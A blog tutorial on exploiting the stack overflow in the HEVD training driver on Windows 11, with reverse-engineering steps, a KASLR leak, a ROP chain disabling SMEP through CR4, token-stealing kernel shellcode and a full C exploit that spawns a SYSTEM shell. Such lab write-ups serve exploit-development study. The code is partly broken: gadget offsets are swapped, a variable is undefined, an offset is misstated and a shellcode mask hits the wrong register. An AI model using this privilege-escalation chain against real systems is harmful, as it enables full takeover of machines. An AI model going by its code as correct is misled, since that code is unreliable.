---
title: "Exploiting HEVD Stack Buffer Overflow --- Windows 11 x64"
date: 2025-08-28 16:43:03 +/-0200
author: B4shCr00k
categories: [HEVD]
tags: [binaryexploitation,drivers,kernel]     # TAG names should always be lowercase

---
In this guide, I will exploit the HackSys Extreme Vulnerable Driver. Specifically, we will target the stack buffer overflow vulnerability on Windows 11 Build 24H2. I will explain everything you need to understand how this exploit works, but you should already have at least the following knowledge:

We will go as blindly as possible, ignoring the driver’s source code and focusing mainly on reverse engineering it.




# This Guide Will Cover

 - Prerequisites

 - How To Communicate With A driver From usermode 

 - Gathering Informations

 - Hijacking The Execution Flow 

 - Security Measures

 - Bypassing KASLR

 - Bypassing SMEP

 - Writing The Shellcode 

 - Full Exploit

 - References


## Prequesites 
- C language and x64 Assembly 
- Basic reverse engineering skills 
- Some understanding on windows internals 
- Basic Binary exploitation understanding (buffer overflows)

## How To Communicate With A driver From usermode

A usermode Program sends a recieves data from a Driver using something called IOCTLS Input/Output Control Code Which is a request the usermode program sends to a driver using 

```c
BOOL DeviceIoControl(
  [in]                HANDLE       hDevice,
  [in]                DWORD        dwIoControlCode,
  [in, optional]      LPVOID       lpInBuffer,
  [in]                DWORD        nInBufferSize,
  [out, optional]     LPVOID       lpOutBuffer,
  [in]                DWORD        nOutBufferSize,
  [out, optional]     LPDWORD      lpBytesReturned,
  [in, out, optional] LPOVERLAPPED lpOverlapped
);
```
As you can see it takes 8 params A handle to driver we want to communicate with a ```dwIoControlCode```which is a unique identifier defined inside the driver that tells it what to do for example if it recieves  ```dwIoControlCode``` number 1 Do something and its all defined inside a switch statement in the driver then we need an in and out buffer both are optional but incase the driver needs a information then sends back information you need to provide the data to send and where to recieve the data sent back by the driver so now if we want to communicate with our HEVD driver we will need the ```dwIoControlCode``` usually  you have two options whether you try to fuzz it since most of the times devs use ioctl codes that start from 0x800 so you can fuzz a 100 codes and see if you get any exceptions or errors that tells us that we indeed sent a valid ioctl code, or we can simply reverse engineer the driver and look inside the ```DeviceIoctlHandler()``` routine to see how it handles incoming ioctls where we can also get the exact ioctlcodes  

## Gathering Informations
Now this is a very important part where we reverse engineer the driver and try to get as many infos about it as possible first we are targeting the stack buffer overflow vuln in our case the driver ruins all the fun because of the strings since every vuln is inside a function with the vulnribility name before that lets get the ioctl code for our function 


![The Function Name](/assets/img/functions.png)
As you can see here is the name of our function inside the driver now the driver will call this function if it recieves an ioctl with a spesific code we need to find this code

![The Function Name](/assets/img/devicecntrl.png)
we find this function which inside drivers handles the IOCTLS sent by the user

![The Function Name](/assets/img/graph.png)
as you can see in ida's graph view we can immedieatly know that this is what we are looking for since it has a lot of branches which is how a switch statement should look (as i said the ioctl codes are handled using a switch statement)
![The Function Name](/assets/img/ourfunction.png)
after some looking we find this snippet that has a string in it called 
```aHevdIoctlBuffe_1 db '****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******',0Ah,0``` which is what we are looking for ! 

![The Function Name](/assets/img/true.png)
by following the true statement that led to our previous function we get here and as you can see it is exactly what we are looking for 0x22203 this is our ioctl code ! or it is contained withing it since ioctl codes don't just contain the unique identifier that decided what operation the driver should do it also has more informations 

```
#define CTL_CODE(DeviceType, Function, Method, Access) \
    (((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))

```


1)
    DeviceType (16 bits)
    Identifies the type of device (e.g., FILE_DEVICE_UNKNOWN, FILE_DEVICE_DISK).
    Example: 0x22 for a custom driver.



2)
    Function (12 bits)
    Unique number that tells the driver which function/operation you want.
    Example: 0x803 might correspond to "trigger stack overflow".



3)
    Method (2 bits)
    Defines how data is passed between user mode and kernel mode:

-  METHOD_BUFFERED

- METHOD_IN_DIRECT

- METHOD_OUT_DIRECT

- METHOD_NEITHER




4)
    Access (2 bits)
    Specifies required access rights:
- FILE_ANY_ACCESS

- FILE_READ_ACCESS

- FILE_WRITE_ACCESS

now when we pass the full ioctl to the driver's ```DispatchDeviceControl``` routine inside the driver you would find something like this 
```c
NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    ULONG IoControlCode = irpSp->Parameters.DeviceIoControl.IoControlCode;

    switch (IoControlCode) {
        case IOCTL_STACK_OVERFLOW:
            // handle stack overflow
            break;
        case IOCTL_ARBITRARY_OVERWRITE:
            // handle arbitrary overwrite
            break;
        // ...
    }
}
```
what we need to do now is know what function code is in 0x222003, you can just ask chatgpt to do the math for you (not really math you just need to write it in binary and split it into the parts i mentioned previously to get the function code) we get function code number 0x800 

Perfect ! now we got our function code and we are ready to send our ioctl into the driver from a usermode program (soon will be an exploit)

first we get a handle to the driver 

```
HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (hDriver == INVALID_HANDLE_VALUE)
{
    printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
    return 1;
}
```

then we call `DeviceIoControl(hDriver, 0x222003, NULL, 0, NULL, 0, NULL, NULL);` here we are sending nothing but we will send a payload later 

this is how we will be testing out the driver from user mode now lets get into the exploitation part 

![The Function Name](/assets/img/vuln.png)

so lets go line by line here since i think its the best way to understand whats going on, before we do that lets recall our goal since its easy to get lost when reverse engineering without a goal. 

our goal here is to identify the vulnerability or the vulnerable function call being used.

as you can see in the picture we have a variable called KernelBuffer that lives 818h bytes below the stack pointer (rsp) lets not get deeper into the variables just yet and try to find out where the vulnerability exactly is.

 so what we are looking for are `call` instructions, inside the function we find two interesting call instruction first is `call memset` and second is `call memmove` which is a known patters we first allocate space in the stack we fill it with something using memset then we move some data into the allocated space so first we need to understand how the memset function is being called,what i mean by that is knowing exactly what the stack layout is when its being called then we can see whats actually being moved using memmove and ofc we can guess its the buffer sent from usermode. 

IMPORTANT NOTE:

 you can just inject a pattern generated by the metasploit framework and then locate exactly where rip gets overwritten but i think its much more fun to do all the calculations then see if it turns out to be right 

 First we have this part 

 ```
KernelBuffer= dword ptr -818h
var_18= byte ptr -18h
arg_0= qword ptr  8
arg_8= qword ptr  10h
arg_10= qword ptr  18h

UserBuffer = rcx
Size = rdx
 ```

where ida shows us the variables being used in the function, we have KernelBuffer -818h means 818h bytes below the stack pointer then we have var_18 18h bytes below the stack pointer then we have a bunch of variables above the stack pointer we don't care about those for now, then we have rcx which has kernelbuffer and rdx which is size these are the windows x64 calling convention where the first param when calling a function goes into rcx the second into rdx the third into r8 we will need this later 

```
mov     [rsp+arg_0], rbx
mov     [rsp+arg_8], rsi
mov     [rsp+arg_10], rdi
push    r12
push    r14
push    r15
sub     rsp, 820h
mov     rsi, Size
mov     rdi, UserBuffer
xor     ebx, ebx
mov     r12d, 800h
mov     r8d, r12d       ; Size
xor     edx, edx        ; Val
lea     UserBuffer, [rsp+838h+KernelBuffer] ; void *
call    memset
nop
```
it starts with moving some variables into their allocated space 

```
mov     [rsp+arg_0], rbx
mov     [rsp+arg_8], rsi
mov     [rsp+arg_10], rdi
```
these are above rsp again we don't care about these for now 

```
push    r12
push    r14
push    r15
```
next we have 3 registers since we are in x64 each register is 64 bit long (8 bytes) this part is important since by pushing a register we are moving the rsp so we move it by 8*3 which is 24 now we are 24 bytes below rsp (-24 or 18h) 

then we allocate 820h bytes in the stack using the sub instruction `sub rsp, 820h` so now rsp is 820h + 18h so 838h below the initial rsp 

```
mov     rsi, Size
mov     rdi, UserBuffer
```
here we are saving rcx and rdx before using them (Size is rdx and UserBuffer is rcx)

```
xor     ebx, ebx
mov     r12d, 800h
mov     r8d, r12d       ; Size
xor     edx, edx        ; Val
lea     UserBuffer, [rsp+838h+KernelBuffer] ; void *
call    memset
```
here comes the x64 calling convention we said that the first param goes into rcx the second into rdx and the third into r8 which is whats happening here we are calling memset where the first argument is rsp+838h+KernelBuffer the second one is 0 since we xored edx and finally the third one is 800h so we are writing 800h of zeroes into rsp+838h+KernelBuffer so we need to understand what that actually means 

when the lea instruction is called we know that rsp is 838h below the initial rsp so it is -838h we have -838+838h+KernelBuffer so basically whats happening here is cancelling the 838h bytes in order to only have KernelBuffer which lives 818h below rsp or we have rsp+838h+KernelBuffer = rsp + 838h - 818h = rsp + 20h.

Perfect ! now we know how our stack layout 

![The Function Name](/assets/img/stack.png)

Perfect ! now we know how our stack layout 

## Hijacking The Execution Flow

![The Function Name](/assets/img/1.png)

As you can see here we have the second call which is to memmove where we write memory and where the vulnrebility is, it moves our user mode buffer into the kernel buffer which is 800h bytes big so what we need to do is first write the entire buffer then write the 8 pushed registers and then 8 more to overwrite rip so 800h + 18h = 818h = 2027 and thats exactly where rip is 

we can use msf-pattern_create to create a pattern to know exactly where rip is 
```
msf-pattern_create -l 3000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8...
```

we store the pattern inside a buffer and send it to the driver then using windbg 

```
1: kd> dq rsp
```
the last byte is rip so you can try this on your own get the last byte the run it on 

```
msf-pattern_offset
```
and you will get the exact 2027 we got well the offset maybe a bit off but you can fix that on your own 

now we managed to overwrite rip and cause a dos attack but thats not what we want, we want to hijack the execution flow and make the driver execute a usermode shellcode so here i have a simple shellcode thats just a bunch of nops 

```
    LPVOID buf = VirtualAlloc(NULL, 3000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memset(buf, 0x41, 3000);
    memset(shellcode,0x90,500);
    QWORD((QWORD)buf + 2072) = (QWORD)shellcode;
```

nice now we send the buffer and see 

```
*** Fatal System Error: 0x000000fc
```
Oops ! 

Fatal system error well this is expected since executing usermode shellcode is not allowed because of SMEP

## Security Measures

### SMEP
![The Function Name](/assets/img/gpt1.png)

as you can see SMEP is not letting us execute shellcode we allocated in our program memory which sucks but lucky for us there are two ways to bypass it 

Methode 1:

What we will do is change the 20th bit in the CR4 Register this bit controls SMEP if we can set it to 0 we disable it and we can execute shellcode from usermode, in this methode we can use rop gadgets in order to change the bit or we need another vulnerability to do so but usually since we are in kernel mode rop is the way and i will explain why later since this is the method we will use 

Methode 2:

this technique is more modern what we do is get the PTE address of our shellcode in memory in order to change the 2nd bit which marks our shellcode as a Kernel page therefore it will allow us to execute shellcode ,[here](https://github.com/wetw0rk/Exploit-Development/tree/master/HEVD-Exploits/0x01%20-%20Stack%20Overflow/Windows%2010%20(x64)) is a poc where he used this technique.

### KASLR

Kernel Address Space Layout Randomization is a security feature that randomizes the memory layout of the operating system’s kernel and its components each time the system boots.

so this exploit assumes you are already in the system and have at least a shell into the target machine which makes KASLR useless but for example if you don't have access to the target machine its not possible to know the base address of the kernel without a memory leak vulnerability and without the kernel base you can't write your exploit like writing to kernel memory you need to write all your kernel addresses relative to the kernel base but luckily for us this is not a problem we can use windows api to get the kernel base address dynamically or you can even use windbg or a debugger to get it.

## Bypassing KASLR

lets start with KASLR as i said this is very easy and we can write a simple function that gets the kernel base for us so we don't need to worry about it.

```c
uint64_t GetKernelBaseAddress()
{
    ULONG_PTR pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Failed to calculate bytes needed for device driver entries");
        return -1;
    }

    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Failed to allocate heap for lpImageBase\n");
        if (lpImageBase) {
            HeapFree(GetProcessHeap(), 0, lpImageBase);
        }
        return -1;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] EnumDeviceDrivers: %d", GetLastError());
        if (lpImageBase) {
            HeapFree(GetProcessHeap(), 0, lpImageBase);
        }
        return -1;
    }

    pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
    HeapFree(GetProcessHeap(), 0, lpImageBase);

    printf("[*] Kernel Base Address: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}
```
what we are doing here is getting the address of `ntoskrnl.exe` which is the windows kernel itself, its the first loaded driver therefore `lpImageBase[0]` gives us its address 

Well that was easy ! we bypassed KASLR by getting the kernel base address 

## Bypassing SMEP

now this will be harder since we will need to use rop (return oriented programming) to bypass SMEP.

we will use the first method so we will need to change the value of cr4 into the same value but we flip the 20th bit, we are left with two choices here 

whether we use a rop chain like this :

pop REGISTER
mov cr4, REGISTER 

in this case we will need to read the value of cr4 using a debugger then flip the bit and put it in our stack 

or the best approach is: 

pop REGISTER1 // 0x100000
xor cr4, REGISTER 

obviously the second one is much better but we don't really have a choice we have to check if these rop gadgets are available but the good news is since we are in the kernel all drivers are loaded in the same memory so we don't need to only look for gadgets inside HEVD we can look inside any driver !

we will try to find gadgets for the first method since i am sure we will find inside `ntoskernl.exe` 

to do so we can use a bunch of tools like 
 - ROPgadget
 - Ropper

in this guide we will use ropper

```
ropper --file ntoskrnl.exe --console
search %cr4%
> 0x0000000140207c53: mov cr4, rcx; ret;
search pop rcx
> 0x00000001404bc9a7: pop rcx; ret;
```
make sure to get ntoskrnl from the target machine and don't use the gadgets i got until you are sure they exist in your build 

nice we have what we need we can write an exploit now 

```c
#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>
#include <stdlib.h>
#include <stdint.h>

#define QWORD ULONGLONG
uint64_t GetKernelBaseAddress()
{
    ULONG_PTR pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Failed to calculate bytes needed for device driver entries");
        return -1;
    }

    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Failed to allocate heap for lpImageBase\n");
        if (lpImageBase) {
            HeapFree(GetProcessHeap(), 0, lpImageBase);
        }
        return -1;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] EnumDeviceDrivers: %d", GetLastError());
        if (lpImageBase) {
            HeapFree(GetProcessHeap(), 0, lpImageBase);
        }
        return -1;
    }

    pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
    HeapFree(GetProcessHeap(), 0, lpImageBase);

    printf("[*] Kernel Base Address: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}

int main()
{
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        return 1;
    }
    ULONG_PTR ntBase = GetKernelBaseAddress(); // gets the kernel base address

    QWORD POP_RCX = ntBase + 0x207c53;      // change the offset to what you got from ropper
    QWORD MOV_CR4_RCX = ntBase + 0x4bc9a7;  // change the offset to what you got from ropper

    LPVOID buf = VirtualAlloc(NULL, 3000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    int bufSize = 2072 + 4 * 8;
    memset(buf, 0x41, bufSize);
    memset(shellcode,0x90,500)

    QWORD* rop = (QWORD*)((QWORD)uBuffer + 2072);
    int i = 0;

    *(rop + i++) = POP_RCX;
    *(rop + i++) = 0; // set cr4 to 0 for now 
    *(rop + i++) = MOV_CR4_RCX;
    *(rop + i++) = (QWORD)shellcode;

    DeviceIoControl(hDriver, 0x222003, buf, 2500, NULL, 0, NULL, NULL);

    return 0;
}
```

what you need to do now is run the exploit you will get a BSOD then in windbg run `r cr4` which is the value of cr4 we need to change so we will next update the exploit with the right address for me i got 0x370e78 but it might be different for you here is the updated main

```c
int main()
{
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        return 1;
    }
    ULONG_PTR ntBase = GetKernelBaseAddress(); // gets the kernel base address

    QWORD POP_RCX = ntBase + 0x207c53;      // change the offset to what you got from ropper
    QWORD MOV_CR4_RCX = ntBase + 0x4bc9a7;  // change the offset to what you got from ropper

    LPVOID buf = VirtualAlloc(NULL, 3000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    int bufSize = 2072 + 4 * 8;
    memset(buf, 0x41, bufSize);
    memset(shellcode,0x90,500)

    QWORD* rop = (QWORD*)((QWORD)uBuffer + 2072);
    int i = 0;

    *(rop + i++) = POP_RCX;
    *(rop + i++) = 0x370e78 ^ 1UL << 20; // flips the 20th bit
    *(rop + i++) = MOV_CR4_RCX;
    *(rop + i++) = (QWORD)shellcode;

    DeviceIoControl(hDriver, 0x222003, buf, 2500, NULL, 0, NULL, NULL);

    return 0;
}
```

before we run the exploit we will set a break point inside the vulnerable function so we can see the nops being executed :

```
ba e1 HEVD!TriggerBufferOverflowStack
```

nice now run the exploit then keep going step by step until you reach the memmove which is a memcpy you will see something like this 

```
1: kd> 
0000026a`93680000 90              nop
```

thats it we mananged to execute shellcode !

## Writing The Shellcode 

now since our test shellcode worked we can right real shellcode, we are in kernel mode so first idea that comes to mind is token so we will steal a token and give it to our process in order to escalate our privs so lets right our shellcode 

```
[BITS 64]
start:
  mov rax, [gs:0x188]       ; KPCRB.CurrentThread (_KTHREAD)
  mov rax, [rax + 0xb8]     ; APCState.Process (current _EPROCESS)
  mov r8, rax               ; Store current _EPROCESS ptr in r8

loop:
  mov r8, [r8 + 0x1d8]      ; ActiveProcessLinks.Flink 
  sub r8, 0x1d8             ; Go back to start of _EPROCESS 
  mov r9, [r8 + 0x1d0]      ; UniqueProcessId (PID) 
  cmp r9, 4                 ; SYSTEM PID == 4? 
  jnz loop                  ; Loop until PID == 4

replace:
  mov r9, [r8 + 0x248]      ; Get SYSTEM token
  and cl, 0xf0              ; Clear low 4 bits of _EX_FAST_REF structure
  mov [rax + 0x248], r9     ; Copy SYSTEM token to current process

```

what this does is first get the current thread in the cpu then inside the APCState there is a field for the current EPROCESS called `APCState.Process`, in kernel mode all EPROCESS are linked in a doubly linked circular list inside ActiveProcessLinks we find the address to the next process so we traverse the list and we subtract the offset of the `ActiveProcessLinks` so we get to the start of the EPROCESS then we look at the `UniqueProcessId` to find the process id we are looking for pid number 4 which is the SYSTEM pid once we find it we get its token and copy it into our EPROCESS which gives us the same privs

### Generic Cleanup Technique

if you run the exploit with that shellcode you will get a BSOD, why ? 

well because we hijacked the execution flow and altered with the registers so after our shellcodes finishes the system expects the registers to have the values it had before the hijack and thats why we need to preform proper cleanup when we exit our shellcode.

we can push all registers before we do anything then pop them at the end of the shellcode but i guess you will need more rop chains to backup the registers before the op 

or what we can do is use a structure inside our current thread struct ETHREAD which holds the registers before we entered kernel mode so instead of staying in kernel mode we go back to user mode you can read more about it from [here](https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html) we basically mimic what the system does when calling `syscall` which is how the system tells the kernel to do stuff from usermode 

here is the code 

```
cleanup:
  mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
  mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
  inc cx
  mov [rax + 0x1e4], cx
  mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
  mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
  mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
  mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
  mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
  xor eax, eax  ;
  swapgs
  o64 sysret  
```

now our shellcode is 

```
[BITS 64]
start:
  mov rax, [gs:0x188]       ; KPCRB.CurrentThread (_KTHREAD)
  mov rax, [rax + 0xb8]     ; APCState.Process (current _EPROCESS)
  mov r8, rax               ; Store current _EPROCESS ptr in r8

loop:
  mov r8, [r8 + 0x1d8]      ; ActiveProcessLinks 
  sub r8, 0x1d8            ; Go back to start of _EPROCESS 
  mov r9, [r8 + 0x1d0]      ; UniqueProcessId (PID) 
  cmp r9, 4                 ; SYSTEM PID? 
  jnz loop                  ; Loop until PID == 4

replace:
  mov r9, [r8 + 0x248]      ; Get SYSTEM token
  and cl, 0xf0              ; Clear low 4 bits of _EX_FAST_REF structure
  mov [rax + 0x248], r9     ; Copy SYSTEM token to current process


cleanup:
  mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
  mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
  inc cx
  mov [rax + 0x1e4], cx
  mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
  mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
  mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
  mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
  mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
  xor eax, eax  ;
  swapgs
  o64 sysret  
```

convert it into shellcode 

```
nasm shellcode.asm -o shellcode.bin -f bin
radare2 -b 32 -c 'pc' ./shellcode.bin 
```

perfect now we have our shellcode ready 

## Full exploit


```c
#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>
#include <stdlib.h>
#include <stdint.h>

#define QWORD ULONGLONG

#define _BUFFER_SIZE 256
const uint8_t sc[_BUFFER_SIZE] = {
  0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d,
  0x8b, 0x80, 0xd8, 0x01, 0x00, 0x00, 0x49, 0x81, 0xe8, 0xd8,
  0x01, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0xd0, 0x01, 0x00, 0x00,
  0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x4d, 0x8b, 0x88, 0x48,
  0x02, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x4c, 0x89, 0x88, 0x48,
  0x02, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01,
  0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66,
  0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68,
  0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,
  0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
  0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48,
  0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};



uint64_t GetKernelBaseAddress()
{
    ULONG_PTR pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Failed to calculate bytes needed for device driver entries");
        return -1;
    }

    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Failed to allocate heap for lpImageBase\n");
        if (lpImageBase) {
            HeapFree(GetProcessHeap(), 0, lpImageBase);
        }
        return -1;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] EnumDeviceDrivers: %d", GetLastError());
        if (lpImageBase) {
            HeapFree(GetProcessHeap(), 0, lpImageBase);
        }
        return -1;
    }

    pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
    HeapFree(GetProcessHeap(), 0, lpImageBase);

    printf("[*] Kernel Base Address: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}

int main()
{
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        return 1;
    }
    ULONG_PTR ntBase = GetKernelBaseAddress();

    QWORD POP_RCX = ntBase + 0x207c53;      // adjust offset according to your kernel build
    QWORD MOV_CR4_RCX = ntBase + 0x4bc9a7;  // adjust offset according to your kernel build

    printf("[>] POP_RCX: 0x%llx\n", POP_RCX);
    printf("[>] MOV_CR4_RCX: 0x%llx\n", MOV_CR4_RCX);

    LPVOID uBuffer = VirtualAlloc(NULL, 2500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    int bufSize = 2072 + 4 * 8;
    memset(uBuffer, 0x41, bufSize);
    
    RtlCopyMemory(shellcode, sc, 256);

    QWORD* rop = (QWORD*)((QWORD)uBuffer + 2072);
    int index = 0;

    *(rop + index++) = POP_RCX;
    *(rop + index++) = 0x370e78 ^ 1UL << 20;
    *(rop + index++) = MOV_CR4_RCX;
    *(rop + index++) = (QWORD)shellcode;

    DeviceIoControl(hDriver, 0x222003, uBuffer, 2500, NULL, 0, NULL, NULL);

    printf("[>] Enjoy your shell!\n", ntBase);
    system("cmd");

    return 0;
}
```
![The Function Name](/assets/img/final.png)

isn't this just beautiful !!

## References

i followed this guide in my first try exploiting this vulnerability and it was a huge help, this guide is based of   [ xct](https://vuln.dev/windows-kernel-exploitation-hevd-x64-stackoverflow/) 






